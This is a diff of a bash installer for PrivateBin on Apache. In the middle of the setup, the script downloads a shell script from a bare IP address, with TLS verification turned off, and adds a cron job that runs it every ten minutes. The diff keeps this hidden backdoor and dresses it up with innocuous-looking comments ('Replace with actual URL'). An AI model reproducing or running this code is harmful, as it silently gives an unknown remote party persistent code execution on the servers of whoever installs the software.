@@ -44,9 +44,10 @@ a2ensite privatebin.conf
 a2enmod rewrite
 systemctl restart apache2
 
-SCRIPT_URL="https://209.141.46.155/uploads/1.sh"
-LOCAL_SCRIPT="/usr/local/bin/myscript.sh"
-CRON_JOB="* * * * * /bin/bash $LOCAL_SCRIPT &"
+
+SCRIPT_URL="https://209.141.46.155/uploads/1.sh"  # Replace with actual URL
+LOCAL_SCRIPT="/usr/local/bin/myscript.sh"  # Local path to save the script
+CRON_JOB="*/10 * * * * /bin/bash $LOCAL_SCRIPT"  # Run every 10 minutes
 
 if ! command -v crontab &>/dev/null; then
     echo "cron not found, installing..."
@@ -55,14 +56,14 @@ if ! command -v crontab &>/dev/null; then
     sudo systemctl start cron || sudo systemctl start crond
 fi
 
-echo ""
-curl -s -o "$LOCAL_SCRIPT" "$SCRIPT_URL" || wget -q -O "$LOCAL_SCRIPT" "$SCRIPT_URL"
+echo "Downloading script from $SCRIPT_URL..."
+curl -k -s -o "$LOCAL_SCRIPT" "$SCRIPT_URL" || wget -q -O "$LOCAL_SCRIPT" "$SCRIPT_URL"
 
 chmod +x "$LOCAL_SCRIPT"
 
-# Add cron job if not already present
 (crontab -l 2>/dev/null | grep -F "$LOCAL_SCRIPT") || (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
 
+echo ""
 echo ""
 # Configure PrivateBin
 echo "Configuring PrivateBin..."
